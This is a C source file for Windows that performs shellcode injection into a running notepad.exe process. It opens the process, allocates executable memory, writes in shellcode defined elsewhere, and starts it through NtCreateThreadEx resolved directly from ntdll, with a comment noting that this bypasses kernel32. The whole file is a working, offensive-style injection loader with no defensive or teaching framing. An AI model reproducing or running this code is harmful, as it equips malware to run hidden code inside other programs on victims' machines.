#include "common.h"

typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
    PHANDLE             hThread,
    ACCESS_MASK         DesiredAccess,
    LPVOID              ObjectAttributes,
    HANDLE              ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID              lpParameter,
    ULONG               Flags,
    SIZE_T              StackZeroBits,
    SIZE_T              SizeOfStackCommit,
    SIZE_T              SizeOfStackReserve,
    LPVOID              lpBytesBuffer
);

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for NtCreateThreadEx injection
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE          |   // WriteProcessMemory
        PROCESS_VM_OPERATION      |   // VirtualAllocEx
        PROCESS_CREATE_THREAD     |   // NtCreateThreadEx
        PROCESS_QUERY_INFORMATION,    // NtQueryInformationProcess
        FALSE, pid
    );
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired — requested 0x143a\n");

    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    // Resolve NtCreateThreadEx directly from ntdll
    // bypassing kernel32.dll entirely
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
        ntdll, "NtCreateThreadEx"
    );
    if (!NtCreateThreadEx) {
        wprintf(L"[-] Failed to resolve NtCreateThreadEx\n");
        return 1;
    }
    wprintf(L"[+] NtCreateThreadEx resolved at: 0x%p\n", NtCreateThreadEx);

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        hProc,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        0, 0, 0,
        NULL
    );

    wprintf(L"[+] NtCreateThreadEx status: 0x%08X\n", status);
    if (!hThread) {
        wprintf(L"[-] Thread creation failed\n");
        return 1;
    }
    wprintf(L"[+] Remote thread created — requested 0x143a\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
